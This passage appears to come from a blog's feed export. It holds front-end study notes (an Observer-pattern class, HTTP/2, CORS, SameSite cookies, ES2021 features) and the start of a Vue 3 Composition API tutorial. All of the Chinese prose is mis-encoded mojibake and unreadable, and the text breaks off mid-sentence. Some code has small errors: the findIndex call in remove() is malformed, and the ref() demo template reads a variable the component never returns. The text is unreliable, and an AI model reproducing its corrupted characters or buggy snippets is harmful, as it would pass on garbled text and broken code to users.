2020-6-1çŽ°åœ¨å½“å‰åšçš„é¡¹ç›®ä¸­é‡åˆ°çš„éš¾é¢˜ï¼š å‚è€ƒï¼šè§„é¿åŠŸèƒ½åž‹é—®é¢˜&amp;ä¸šåŠ¡æ€§é—®é¢˜ï¼Œé™¤éžæ˜¯åŠŸèƒ½å’Œä¸šåŠ¡ç¡®å®žå¾ˆå¤æ‚ï¼Œä¾‹å¦‚ï¼š å•ç‚¹ç™»å½• æƒé™çš„å¤šç»´åº¦ç®¡æŽ§ å¤šç»„å»ºä¿¡æ¯çš„å¤æ‚å…±äº«ç±»é—®é¢˜ äº§å“å®‰å…¨è§£å†³ç­–ç•¥ ç›´æ’­ç±»ã€éŸ³è§†é¢‘ç±»ã€å®žæ—¶é€šä¿¡ç±»ã€å¯è§†åŒ–å¤„ç†ç±»â€¦åŠŸèƒ½æ€§çªç ´æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆï¼š webpack å±‚é¢ http å±‚é¢ ç§»åŠ¨ç«¯é¡¹ç›®å°† http1.1 -&gt; http2ï¼Œé€šè¿‡å‡çº§ Nginx-openresty çš„ sslï¼Œè¦æ±‚é«˜äºŽ 1.0.2ï¼Œç„¶åŽé…ç½® listen 443 ç«¯å£åŠ ä¸Š ssl http2 å³å¯ã€‚ é¡µé¢æ¸²æŸ“å±‚é¢ éª¨æž¶å± å»¶è¿Ÿ/å¼‚æ­¥åŠ è½½ å¤§æ•°æ®æ¸²æŸ“ä¼˜åŒ–å¼ºè°ƒç»“æžœï¼Œä¹‹å‰æ‰“åŒ…/åŠ è½½æ—¶é—´ N ç§’ï¼Œæˆ‘å¤„ç†åŽä¼˜åŒ– ç»„å»ºå°è£…ï¼š å…¬å…±æ–¹æ³•åº“ æ’ä»¶/ç»„å»ºå°è£… &amp; å¼€æºçº§æ’ä»¶ç»„å»ºçš„æ‰“é€  vue è‡ªå®šä¹‰æŒ‡ä»¤é™¤äº†å¼ºè°ƒç»“æžœã€Œä¾‹å¦‚ï¼šä¹‹å‰åŠä¸ªæœˆå¼€å‘å‘¨æœŸï¼ŒçŽ°åœ¨åªéœ€ 7 å¤©ã€è¿˜å¯ä»¥çªå‡ºè‡ªå·±åœ¨æºç æ–¹é¢çš„é˜…è¯»èƒ½åŠ› èŠå¤©æ¶ˆæ¯ç¡®è®¤æœºåˆ¶ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// è§‚å¯Ÿè€…æ¨¡å¼// æŸä¸ªäº‹ä»¶æ‹¥æœ‰å”¯ä¸€æ ‡è¯†ä½œä¸ºé”®åï¼Œä¸Žä¹‹ç»‘å®šçš„äº‹ä»¶é˜Ÿåˆ—ä½œä¸ºå€¼// &#123;// [key1]: [fn1a, fn1b, fn1c],// [key2]: [fn2a, fn2b, fn2c],// &#125;class Observer &#123; constructor() &#123; this.data = &#123;&#125; &#125; // ç›‘å¬ listen(key, callback) &#123; if (!this.data.hasOwnProperty(key)) &#123; this.data[key] = [] &#125; this.data[key].push(callback) &#125; // è§¦å‘ trigger(...args) &#123; const key = args[0] const callbacks = this.data[key] if (!callbacks || !Array.isArray(callbacks) || !callbacks.length) return callbacks.forEach((callback) =&gt; callback.apply(this, args.slice(1))) &#125; // åˆ é™¤ remove(key, callback) &#123; const callbacks = this.data[key] if (!callbacks) return if (!callback) &#123; callbacks.length = 0 &#125; else &#123; const index = callbacks.findIndex((value = value === callback)) callbacks.splice(index, 1) &#125; &#125;&#125;const fn = () =&gt; &#123; console.log('fn')&#125;const ob = new Observer()ob.listen('key1', fn)console.log('ob: ', ob)ob.trigger('key1')ob.remove('key1')console.log('ob: ', ob) å›¾ç‰‡åŽ‹ç¼©é—®é¢˜ èŽ·å–ä¸åˆ°å›¾ç‰‡å¤§å°base64 -&gt; formData åŽ‹ç¼©é»‘å±é—®é¢˜ é”®ç›˜å…¼å®¹æ–¹æ¡ˆ 2020-6-7æ‰‹å†™ async await çš„æœ€ç®€å®žçŽ°ï¼ˆ20 è¡Œï¼‰ 2020-7-18Chrome DevTools ä¸­çš„è¿™äº›éªšæ“ä½œï¼Œä½ éƒ½çŸ¥é“å—ï¼Ÿä»‹ç»äº†ä¸€äº›åœ¨ Chrome DevTools ä¸­çš„ä¸€äº›æœ‰ç”¨è€Œå°‘æœ‰äººçŸ¥çš„æ“ä½œï¼ŒSnippets æœ€éªšï¼ŒSources -&gt; Snippets å³å¯åœ¨æµè§ˆå™¨ä¸Šç”Ÿæˆ js æ–‡ä»¶ 2020-7-2110 ä¸ª Vue å¼€å‘æŠ€å·§åŠ©åŠ›æˆä¸ºæ›´å¥½çš„å·¥ç¨‹å¸ˆ ä»‹ç»äº† Vue çš„ 10 ä¸ªé«˜é˜¶ç”¨æ³•ï¼Œè®©äººçœ¼å‰ä¸€äº®çš„ç”¨æ³•æ˜¯åŒæ—¶ç›‘å¬å¤šä¸ªå˜é‡çš„ç”¨æ³•ï¼šå®šä¹‰ä¸€ä¸ªè®¡ç®—å±žæ€§ï¼Œå®ƒçš„å€¼ä¸ºå¤šä¸ªå˜é‡ç»„æˆçš„å¯¹è±¡ï¼Œå¤šä¸ªå˜é‡å…¶ä¸­æœ‰å‘ç”Ÿå˜åŒ–ï¼Œåˆ™è®¡ç®—å±žæ€§ä¹Ÿä¼šå˜åŒ–ï¼Œç›‘å¬è¿™ä¸ªè®¡ç®—å±žæ€§å°±å¯ä»¥çŸ¥é“è¿™äº›å˜é‡æœ‰å˜åŒ–äº†ï¼å†è€…ï¼Œä½¿ç”¨ @hook å³å¯ç›‘å¬ç»„ä»¶ç”Ÿå‘½å‘¨æœŸï¼Œæ¯”å¦‚ï¼š&lt;List @hook:mounted=&quot;listenMounted&quot;&gt;&lt;/List&gt; 2020-7-30React æºç å‰–æžç³»åˆ— ï¼ ä¸å¯æ€è®®çš„ react diff 2020-9-1åœ¨æ·˜å®ä¼˜åŒ–äº†ä¸€ä¸ªå¤§åž‹é¡¹ç›®ï¼Œåˆ†äº«ä¸€äº›å¹²è´§ï¼ˆWebpackï¼ŒSplitChunk ä»£ç å®žä¾‹ï¼Œå›¾æ–‡ç»“åˆï¼‰ 2020-10-30é˜”åˆ«ä¸¤å¹´ï¼Œwebpack5 æ­£å¼å‘å¸ƒ 2020-10-31é¢„æµ‹æœ€è¿‘é¢è¯•ä¼šè€ƒ Cookie çš„ SameSite å±žæ€§2020 å¹´ 2 æœˆä»½ Chrome 80 ç‰ˆæœ¬ä¸­é»˜è®¤å±è”½äº†ç¬¬ä¸‰æ–¹çš„ Cookieï¼Œè¿™æ ·ä¼šé€ æˆä¸€äº›è·¨ç«™ Cookie é‰´æƒé—®é¢˜ï¼Œè§£å†³æ–¹æ¡ˆæ˜¯åœ¨å“åº”å¤´åŠ ä¸Š set-cookie: SameSite: None; å¾®å‰ç«¯ç©¶ç«Ÿæ˜¯ä»€ä¹ˆï¼Œå¯ä»¥å¸¦æ¥ä»€ä¹ˆæ”¶ç›Š å¾®å‰ç«¯æ¦‚å¿µæ˜¯ä»Žå¾®æœåŠ¡æ¦‚å¿µæ‰©å±•è€Œæ¥çš„ï¼Œæ‘’å¼ƒå¤§åž‹å•ä½“æ–¹å¼ï¼Œå°†å‰ç«¯æ•´ä½“åˆ†è§£ä¸ºå°è€Œç®€å•çš„å—ï¼Œè¿™äº›å—å¯ä»¥ç‹¬ç«‹å¼€å‘ã€æµ‹è¯•å’Œéƒ¨ç½²ï¼ŒåŒæ—¶ä»ç„¶èšåˆä¸ºä¸€ä¸ªäº§å“å‡ºçŽ°åœ¨å®¢æˆ·é¢å‰ã€‚å¯ä»¥ç†è§£å¾®å‰ç«¯æ˜¯ä¸€ç§å°†å¤šä¸ªå¯ç‹¬ç«‹äº¤ä»˜çš„å°åž‹å‰ç«¯åº”ç”¨èšåˆä¸ºä¸€ä¸ªæ•´ä½“çš„æž¶æž„é£Žæ ¼ã€‚ 2021-3-7ES2021 æ–°ç‰¹æ€§æå‰çŸ¥ï¼Œé™„æ¡ˆä¾‹ ES7-ES12 ç©ºå€¼åˆå¹¶è¿ç®—ç¬¦ï¼ˆ??ï¼‰ï¼Œå·¦ä¾§çš„æ•°ä¸º undefined æˆ–è€… null æ—¶ï¼Œè¿”å›žå³ä¾§æ“ä½œæ•°ï¼Œå¦åˆ™è¿”å›žå·¦ä¾§ï¼› å¯é€‰é“¾æ“ä½œç¬¦ï¼ˆ?.ï¼‰ï¼Œè¯»å–å¯¹è±¡é“¾æ·±å¤„å±žæ€§çš„å€¼ï¼Œä¸å¿…éªŒè¯é“¾ä¸­çš„æ¯ä¸ªå±žæ€§æ˜¯å¦æœ‰æ•ˆï¼› BigIntï¼Œè¡¨ç¤ºä»»æ„å¤§çš„æ•´æ•°ï¼Œä¸èƒ½å’Œ Math å’Œ Number å¯¹è±¡æ··åˆè¿ç®—ï¼Œå¦åˆ™ä¼šä¸¢å¤±ç²¾åº¦ï¼› String.prototype.matchAll()ï¼Œè¿”å›žä¸€ä¸ªåŒ…å«æ‰€æœ‰åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„ç»“æžœåŠåˆ†ç»„æ•èŽ·ç»„çš„è¿­ä»£å™¨ï¼› Promise.allSettled()ï¼Œå¹¶å‘ä»»åŠ¡ä¸­ï¼Œæ— è®ºä¸€ä¸ªä»»åŠ¡æ­£å¸¸æˆ–è€…å¼‚å¸¸ï¼Œéƒ½è¿”å›žå¯¹åº”çš„çŠ¶æ€ï¼› é€»è¾‘è¿ç®—æ³•ç¬¦å’Œèµ‹å€¼è¡¨è¾¾å¼ a&amp;&amp;=b -&gt; a&amp;&amp;a=bï¼Œa||=b -&gt; a||a=bï¼Œa??=b -&gt; a??a=bï¼› String.prototype.replaceAll()ï¼Œè¿”å›žä¸€ä¸ªæ–°å­—ç¬¦ä¸²ï¼Œæ–°å­—ç¬¦ä¸²ä¸­æ‰€æœ‰æ»¡è¶³ pattern çš„éƒ¨åˆ†ä¼šè¢« replacement æ›¿æ¢ï¼› æ•°å­—åˆ†éš”ç¬¦ï¼Œè¾ƒé•¿æ•°å­—æ¯ 3 ä½æ·»åŠ ä¸€ä¸ªåˆ†éš”ç¬¦ï¼ˆ_æˆ–è€…,ï¼‰ï¼› Promise.any()ï¼Œè¿”å›žç¬¬ä¸€ä¸ªæˆåŠŸï¼ˆresolveï¼‰çš„ç»“æžœï¼Œå…¨éƒ¨ä¸ºå¤±è´¥ï¼ˆrejectï¼‰èµ° catchï¼› WeakRef åˆ›å»ºä¸€ä¸ªå¼±å¼•ç”¨ï¼› 2021-3-13è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£ 2022-3-21è·¨åŸŸè¯·æ±‚å¦‚ä½•æºå¸¦ cookie? åˆ†ä¸ºä¸¤æ­¥å¤„ç†ï¼Œå¤„ç†è·¨åŸŸï¼Œå“åº”å¤´è®¾ç½® Access-Control-Allow-Origin: https://simple.com å…è®¸ç‰¹å®šçš„åŸŸåå‘é€è·¨åŸŸè¯·æ±‚ï¼›å¤„ç†æºå¸¦ cookieï¼Œå“åº”å¤´è®¾ç½®Access-Control-Allow-Credentialsï¼štrue å…è®¸æºå¸¦èº«ä»½ï¼ˆCookieï¼Œauthorizationï¼‰ã€‚ 2022-9-19å—¨ï¼Œä½ çœŸçš„æ‡‚ this å—ï¼ŸJS çš„ this æŒ‡å‘å›¾è§£ javascript çš„ this æŒ‡å‘nvmthis,call,bind,apply]]></content>
      <tags>
        <tag>å‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue3.0 ä¿®ç‚¼æ‰‹å†Œ]]></title>
    <url>%2F2020%2F05%2F12%2Fvue3-composition-api%2F</url>
    <content type="text"><![CDATA[å‰è¨€éšç€2020å¹´4æœˆä»½ Vue3.0 beta å‘å¸ƒï¼ŒæƒŠå–œäºŽå…¶æ€§èƒ½çš„æå‡ï¼Œå‹å¥½çš„ TS æ”¯æŒï¼ˆè¯­æ³•è¡¥å…¨ï¼‰ï¼Œæ”¹å†™ES exportå†™æ³•ï¼Œåˆ©ç”¨Tree shaking å‡å°‘æ‰“åŒ…å¤§å°,Composition APIï¼ŒCustom Renderer API æ–°åŠŸèƒ½æ‹“å±•åŠå…¶RECs æ–‡æ¡£çš„å®Œå–„ã€‚å½“ç„¶ï¼Œè¿˜æœ‰ä¸€äº›åŽç»­å·¥ä½œï¼ˆvuex, vue-router, cli, vue-test-utils, DevTools, Vetur, Nuxtï¼‰å¾…å®Œæˆï¼Œå½“å‰è¿˜ä¸ç¨³å®šï¼Œæ­£å¼åœ¨é¡¹ç›®ä¸­ä½¿ç”¨ï¼ˆç›®å‰å¯ä»¥åœ¨å°åž‹æ–°é¡¹ç›®ä¸­ï¼‰ï¼Œè¿˜éœ€åœ¨2020 Q2ç¨³å®šç‰ˆæœ¬ä¹‹åŽã€‚ Vue3.0 çš„åˆ°æ¥å·²åªæ˜¯æ—¶é—´é—®é¢˜ï¼Œæœªé›¨ç»¸ç¼ªï¼Œä½•ä¸å…ˆæ¥å°é²œä¸€æ³¢æ–°ç‰¹æ€§ï½ž è®¾è®¡åŠ¨æœºé€»è¾‘ç»„åˆä¸Žå¤ç”¨ç»„ä»¶ API è®¾è®¡æ‰€é¢å¯¹çš„æ ¸å¿ƒé—®é¢˜ä¹‹ä¸€å°±æ˜¯å¦‚ä½•ç»„ç»‡é€»è¾‘ï¼Œä»¥åŠå¦‚ä½•åœ¨å¤šä¸ªç»„ä»¶ä¹‹é—´æŠ½å–å’Œå¤ç”¨é€»è¾‘ã€‚åŸºäºŽ Vue 2.x ç›®å‰çš„ API æˆ‘ä»¬æœ‰ä¸€äº›å¸¸è§çš„é€»è¾‘å¤ç”¨æ¨¡å¼ï¼Œä½†éƒ½æˆ–å¤šæˆ–å°‘å­˜åœ¨ä¸€äº›é—®é¢˜ã€‚è¿™äº›æ¨¡å¼åŒ…æ‹¬ï¼š Mixins é«˜é˜¶ç»„ä»¶ (Higher-order Components, aka HOCs) Renderless Components (åŸºäºŽ scoped slots / ä½œç”¨åŸŸæ’æ§½å°è£…é€»è¾‘çš„ç»„ä»¶ï¼‰ ä»¥ä¸Šè¿™äº›æ¨¡å¼å­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š æ¨¡ç‰ˆä¸­çš„æ•°æ®æ¥æºä¸æ¸…æ™°ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå½“ä¸€ä¸ªç»„ä»¶ä¸­ä½¿ç”¨äº†å¤šä¸ª mixin çš„æ—¶å€™ï¼Œå…‰çœ‹æ¨¡ç‰ˆä¼šå¾ˆéš¾åˆ†æ¸…ä¸€ä¸ªå±žæ€§åˆ°åº•æ˜¯æ¥è‡ªå“ªä¸€ä¸ª mixinã€‚HOC ä¹Ÿæœ‰ç±»ä¼¼çš„é—®é¢˜ã€‚ å‘½åç©ºé—´å†²çªã€‚ç”±ä¸åŒå¼€å‘è€…å¼€å‘çš„ mixin æ— æ³•ä¿è¯ä¸ä¼šæ­£å¥½ç”¨åˆ°ä¸€æ ·çš„å±žæ€§æˆ–æ˜¯æ–¹æ³•åã€‚HOC åœ¨æ³¨å…¥çš„ props ä¸­ä¹Ÿå­˜åœ¨ç±»ä¼¼é—®é¢˜ã€‚ æ€§èƒ½ã€‚HOC å’Œ Renderless Components éƒ½éœ€è¦é¢å¤–çš„ç»„ä»¶å®žä¾‹åµŒå¥—æ¥å°è£…é€»è¾‘ï¼Œå¯¼è‡´æ— è°“çš„æ€§èƒ½å¼€é”€ã€‚ Composition API å— React Hooks çš„å¯å‘ï¼Œæä¾›äº†ä¸€ä¸ªå…¨æ–°çš„é€»è¾‘å¤ç”¨æ–¹æ¡ˆï¼Œä¸”ä¸å­˜åœ¨ä¸Šè¿°é—®é¢˜ã€‚ä½¿ç”¨åŸºäºŽå‡½æ•°çš„ APIï¼Œæˆ‘ä»¬å¯ä»¥å°†ç›¸å…³è”çš„ä»£ç æŠ½å–åˆ°ä¸€ä¸ª &quot;composition function&quot;ï¼ˆç»„åˆå‡½æ•°ï¼‰ä¸­ â€”â€” è¯¥å‡½æ•°å°è£…äº†ç›¸å…³è”çš„é€»è¾‘ï¼Œå¹¶å°†éœ€è¦æš´éœ²ç»™ç»„ä»¶çš„çŠ¶æ€ä»¥å“åº”å¼çš„æ•°æ®æºçš„æ–¹å¼è¿”å›žå‡ºæ¥ã€‚è¿™é‡Œæ˜¯ä¸€ä¸ªç”¨ç»„åˆå‡½æ•°æ¥å°è£…é¼ æ ‡ä½ç½®ä¾¦å¬é€»è¾‘çš„ä¾‹å­ï¼š 1234567891011121314151617181920212223242526function useMouse() &#123; const x = ref(0) const y = ref(0) const update = e =&gt; &#123; x.value = e.pageX y.value = e.pageY &#125; onMounted(() =&gt; &#123; window.addEventListener('mousemove', update) &#125;) onUnmounted(() =&gt; &#123; window.removeEventListener('mousemove', update) &#125;) return &#123; x, y &#125;&#125;// åœ¨ç»„ä»¶ä¸­ä½¿ç”¨è¯¥å‡½æ•°const Component = &#123; setup() &#123; const &#123; x, y &#125; = useMouse() // ä¸Žå…¶å®ƒå‡½æ•°é…åˆä½¿ç”¨ const &#123; z &#125; = useOtherLogic() return &#123; x, y, z &#125; &#125;, template: `&lt;div&gt;&#123;&#123; x &#125;&#125; &#123;&#123; y &#125;&#125; &#123;&#123; z &#125;&#125;&lt;/div&gt;`&#125; ä»Žä»¥ä¸Šä¾‹å­ä¸­å¯ä»¥çœ‹åˆ°ï¼š æš´éœ²ç»™æ¨¡ç‰ˆçš„å±žæ€§æ¥æºæ¸…æ™°ï¼ˆä»Žå‡½æ•°è¿”å›žï¼‰ï¼› è¿”å›žå€¼å¯ä»¥è¢«ä»»æ„é‡å‘½åï¼Œæ‰€ä»¥ä¸å­˜åœ¨å‘½åç©ºé—´å†²çªï¼› æ²¡æœ‰åˆ›å»ºé¢å¤–çš„ç»„ä»¶å®žä¾‹æ‰€å¸¦æ¥çš„æ€§èƒ½æŸè€—ã€‚ ç±»åž‹æŽ¨å¯¼3.0 çš„ä¸€ä¸ªä¸»è¦è®¾è®¡ç›®æ ‡æ˜¯å¢žå¼ºå¯¹ TypeScript çš„æ”¯æŒã€‚åŸºäºŽå‡½æ•°çš„ API å¤©ç„¶å¯¹ç±»åž‹æŽ¨å¯¼å¾ˆå‹å¥½ï¼Œå› ä¸º TS å¯¹å‡½æ•°çš„å‚æ•°ã€è¿”å›žå€¼å’Œæ³›åž‹çš„æ”¯æŒå·²ç»éžå¸¸å®Œå¤‡ã€‚ æ‰“åŒ…å°ºå¯¸åŸºäºŽå‡½æ•°çš„ API æ¯ä¸€ä¸ªå‡½æ•°éƒ½å¯ä»¥ä½œä¸º named ES export è¢«å•ç‹¬å¼•å…¥ï¼Œè¿™ä½¿å¾—å®ƒä»¬å¯¹ tree-shaking éžå¸¸å‹å¥½ã€‚æ²¡æœ‰è¢«ä½¿ç”¨çš„ API çš„ç›¸å…³ä»£ç å¯ä»¥åœ¨æœ€ç»ˆæ‰“åŒ…æ—¶è¢«ç§»é™¤ã€‚åŒæ—¶ï¼ŒåŸºäºŽå‡½æ•° API æ‰€å†™çš„ä»£ç ä¹Ÿæœ‰æ›´å¥½çš„åŽ‹ç¼©æ•ˆçŽ‡ï¼Œå› ä¸ºæ‰€æœ‰çš„å‡½æ•°åå’Œ setup å‡½æ•°ä½“å†…éƒ¨çš„å˜é‡åéƒ½å¯ä»¥è¢«åŽ‹ç¼©ï¼Œä½†å¯¹è±¡å’Œ class çš„å±žæ€§/æ–¹æ³•åå´ä¸å¯ä»¥ã€‚ Composition API é™¤äº†æ¸²æŸ“å‡½æ•° API å’Œä½œç”¨åŸŸæ’æ§½è¯­æ³•ä¹‹å¤–çš„æ‰€æœ‰å†…å®¹éƒ½å°†ä¿æŒä¸å˜ï¼Œæˆ–è€…é€šè¿‡å…¼å®¹æ€§æž„å»ºè®©å…¶ä¸Ž 2.x ä¿æŒå…¼å®¹ Vue 3.0å¹¶ä¸åƒ Angular é‚£æ ·è¶…å¼ºè·¨åº¦ç‰ˆæœ¬ï¼Œå¯¼è‡´ä¸å…¼å®¹ï¼Œè€Œæ˜¯åœ¨å…¼å®¹ 2.x åŸºç¡€ä¸Šåšæ”¹è¿›ã€‚ åœ¨è¿™é‡Œå¯ä»¥åœ¨ 2.x ä¸­é€šè¿‡å¼•å…¥ @vue/composition-apiï¼Œä½¿ç”¨ Vue 3.0 æ–°ç‰¹æ€§ã€‚ åˆå§‹åŒ–é¡¹ç›®1ã€å®‰è£… vue-cli3 1npm install -g @vue/cli 2ã€åˆ›å»ºé¡¹ç›® 1vue create vue3 3ã€é¡¹ç›®ä¸­å®‰è£… composition-api 1npm install @vue/composition-api --save 4ã€åœ¨ä½¿ç”¨ä»»ä½• @vue/composition-api æä¾›çš„èƒ½åŠ›å‰ï¼Œå¿…é¡»å…ˆé€šè¿‡ Vue.use() è¿›è¡Œå®‰è£… 1234import Vue from 'vue'import VueCompositionApi from '@vue/composition-api'Vue.use(VueCompositionApi) setup()Vue3 å¼•å…¥ä¸€ä¸ªæ–°çš„ç»„ä»¶é€‰é¡¹ï¼Œsetup()ï¼Œå®ƒä¼šåœ¨ä¸€ä¸ªç»„ä»¶å®žä¾‹è¢«åˆ›å»ºæ—¶ï¼Œåˆå§‹åŒ–äº† props ä¹‹åŽè°ƒç”¨ã€‚ ä¼šæŽ¥æ”¶åˆ°åˆå§‹çš„ props ä½œä¸ºå‚æ•°ï¼š 12345678export default &#123; props: &#123; name: String &#125;, setup(props) &#123; console.log(props.name) &#125;&#125; ä¼ è¿›æ¥çš„ props æ˜¯å“åº”å¼çš„ï¼Œå½“åŽç»­ props å‘ç”Ÿå˜åŠ¨æ—¶å®ƒä¹Ÿä¼šè¢«æ¡†æž¶å†…éƒ¨åŒæ­¥æ›´æ–°ã€‚ä½†å¯¹äºŽç”¨æˆ·ä»£ç æ¥è¯´ï¼Œå®ƒæ˜¯ä¸å¯ä¿®æ”¹çš„ï¼ˆä¼šå¯¼è‡´è­¦å‘Šï¼‰ã€‚ åŒæ—¶ï¼Œsetup() æ‰§è¡Œæ—¶æœºç›¸å½“äºŽ 2.x ç”Ÿå‘½å‘¨æœŸ beforeCreate ä¹‹åŽï¼Œä¸”åœ¨ created ä¹‹å‰ï¼š 123456789101112131415export default &#123; beforeCreate() &#123; console.log('beforeCreate') &#125;, setup() &#123; console.log('setup') &#125;, created() &#123; console.log('created') &#125;&#125;// æ‰“å°ç»“æžœ// beforeCreate// setup// created åœ¨ setup() ä¸­ this ä¸å†æ˜¯ vue å®žä¾‹å¯¹è±¡äº†ï¼Œè€Œæ˜¯ undefinedï¼Œå¯ä»¥ç†è§£ä¸ºæ­¤æ—¶æœºå®žä¾‹è¿˜æ²¡æœ‰åˆ›å»ºã€‚åœ¨ setup() ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸Šä¸‹æ–‡å‚æ•°ï¼Œæä¾›äº†ä¸€äº› 2.x this ä¸Šæœ‰ç”¨å±žæ€§ã€‚ 12345678910111213141516171819export default &#123; setup(props, context) &#123; console.log('this: ', this) console.log('context: ', context) &#125;&#125;// æ‰“å°ç»“æžœ// this: undefined// context: &#123;// attrs: Object// emit: f()// isServer: false// listeners: Object// parent: VueComponent// refs: Object// root: Vue// slots: &#123;&#125;// ssrContext: undefined// &#125; ç±»ä¼¼ data()ï¼Œsetup() å¯ä»¥è¿”å›žä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¸Šçš„å±žæ€§å°†ä¼šæš´éœ²ç»™æ¨¡ç‰ˆçš„æ¸²æŸ“ä¸Šä¸‹æ–‡ï¼š 12345678910111213&lt;template&gt; &lt;div&gt;&#123;&#123; name &#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; setup() &#123; return &#123; name: 'zs' &#125; &#125;&#125;&lt;/script&gt; reactive()ç­‰ä»·äºŽ vue 2.x ä¸­çš„ Vue.observable() å‡½æ•°ï¼Œvue 3.x ä¸­æä¾›äº† reactive() å‡½æ•°ï¼Œç”¨æ¥åˆ›å»ºå“åº”å¼çš„æ•°æ®å¯¹è±¡ã€‚ å½“ï¼ˆå¼•ç”¨ï¼‰æ•°æ®ç›´æŽ¥æ”¹å˜ä¸ä¼šè®©æ¨¡ç‰ˆå“åº”æ›´æ–°æ¸²æŸ“ï¼š 12345678910111213141516&lt;template&gt; &lt;div&gt;count: &#123;&#123;state.count&#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; setup() &#123; const state = &#123; count: 0 &#125; setTimeout(() =&gt; &#123; state.count++ &#125;) return &#123; state &#125; &#125;&#125;// ä¸€ç§’åŽé¡µé¢æ²¡æœ‰å˜åŒ–&lt;/script&gt; reactive åˆ›å»ºçš„å“åº”å¼æ•°æ®å¯¹è±¡ï¼Œåœ¨å¯¹è±¡å±žæ€§å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ¨¡ç‰ˆæ˜¯å¯ä»¥å“åº”æ›´æ–°æ¸²æŸ“çš„ï¼š 1234567891011121314151617181920&lt;template&gt; &lt;div&gt;count: &#123;&#123;state.count&#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; reactive &#125; from '@vue/composition-api'export default &#123; setup() &#123; const state = reactive(&#123; count: 0 &#125;) setTimeout(() =&gt; &#123; state.count++ &#125;, 1000) return &#123; state &#125; &#125;&#125;// ä¸€ç§’åŽé¡µé¢æ•°å­—ä»Ž0å˜æˆ1&lt;/script&gt; ref()åœ¨ Javascript ä¸­ï¼ŒåŽŸå§‹ç±»åž‹ï¼ˆå¦‚ Stringï¼ŒNumberï¼‰åªæœ‰å€¼ï¼Œæ²¡æœ‰å¼•ç”¨ã€‚å¦‚æžœåœ¨ä¸€ä¸ªå‡½æ•°ä¸­è¿”å›žä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ï¼ŒæŽ¥æ”¶åˆ°è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»£ç åªä¼šèŽ·å¾—ä¸€ä¸ªå€¼ï¼Œæ˜¯æ— æ³•è¿½è¸ªåŽŸå§‹å˜é‡åŽç»­çš„å˜åŒ–çš„ã€‚ 1234567891011121314151617181920&lt;template&gt; &lt;div&gt;count: &#123;&#123;state.count&#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; ref &#125; from '@vue/composition-api'export default &#123; setup() &#123; const count = 0 setTimeout(() =&gt; &#123; count++ &#125;, 1000) return &#123; count &#125; &#125;&#125;// é¡µé¢æ²¡æœ‰å˜åŒ–&lt;/script&gt; å› æ­¤ï¼ŒåŒ…è£…å¯¹è±¡ ref() çš„æ„ä¹‰å°±åœ¨äºŽæä¾›ä¸€ä¸ªè®©æˆ‘ä»¬èƒ½å¤Ÿåœ¨å‡½æ•°ä¹‹é—´ä»¥å¼•ç”¨çš„æ–¹å¼ä¼ é€’ä»»æ„ç±»åž‹å€¼çš„å®¹å™¨ã€‚è¿™æœ‰ç‚¹åƒ React Hooks ä¸­çš„ useRef â€”â€” ä½†ä¸åŒçš„æ˜¯ Vue çš„åŒ…è£…å¯¹è±¡åŒæ—¶è¿˜æ˜¯å“åº”å¼çš„æ•°æ®æºã€‚æœ‰äº†è¿™æ ·çš„å®¹å™¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨å°è£…äº†é€»è¾‘çš„ç»„åˆå‡½æ•°ä¸­å°†çŠ¶æ€ä»¥å¼•ç”¨çš„æ–¹å¼ä¼ å›žç»™ç»„ä»¶ã€‚ç»„ä»¶è´Ÿè´£å±•ç¤ºï¼ˆè¿½è¸ªä¾èµ–ï¼‰ï¼Œç»„åˆå‡½æ•°è´Ÿè´£ç®¡ç†çŠ¶æ€ï¼ˆè§¦å‘æ›´æ–°ï¼‰ã€‚ ref() è¿”å›žçš„æ˜¯ä¸€ä¸ª value reference ï¼ˆåŒ…è£…å¯¹è±¡ï¼‰ã€‚ä¸€ä¸ªåŒ…è£…å¯¹è±¡åªæœ‰ä¸€ä¸ªå±žæ€§ï¼š.value ï¼Œè¯¥å±žæ€§æŒ‡å‘å†…éƒ¨è¢«åŒ…è£…çš„å€¼ã€‚åŒ…è£…å¯¹è±¡çš„å€¼å¯ä»¥è¢«ç›´æŽ¥ä¿®æ”¹ã€‚ 123456789101112131415&lt;script&gt;import &#123; ref &#125; from '@vue/composition-api'export default &#123; setup() &#123; const count = ref(0) console.log('count.value: ', count.value) count.value++ // ç›´æŽ¥ä¿®æ”¹åŒ…è£…å¯¹è±¡çš„å€¼ console.log('count.value: ', count.value) &#125;&#125;// æ‰“å°ç»“æžœï¼š// count.value: 0// count.value: 1&lt;/script&gt; å½“åŒ…è£…å¯¹è±¡è¢«æš´éœ²ç»™æ¨¡ç‰ˆæ¸²æŸ“ä¸Šä¸‹æ–‡ï¼Œæˆ–æ˜¯è¢«åµŒå¥—åœ¨å¦ä¸€ä¸ªå“åº”å¼å¯¹è±¡ä¸­çš„æ—¶å€™ï¼Œå®ƒä¼šè¢«è‡ªåŠ¨å±•å¼€ (unwrap) ä¸ºå†…éƒ¨çš„å€¼ï¼š 1234567891011121314151617&lt;template&gt; &lt;div&gt;ref count: &#123;&#123;count&#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; ref &#125; from '@vue/composition-api'export default &#123; setup() &#123; const count = ref(0) console.log('count.value: ', count.value) return &#123; count // åŒ…è£…å¯¹è±¡ value å±žæ€§è‡ªåŠ¨å±•å¼€ &#125; &#125;&#125;&lt;/script&gt; ä¹Ÿå¯ä»¥ç”¨ ref() åŒ…è£…å¯¹è±¡ä½œä¸º reactive() 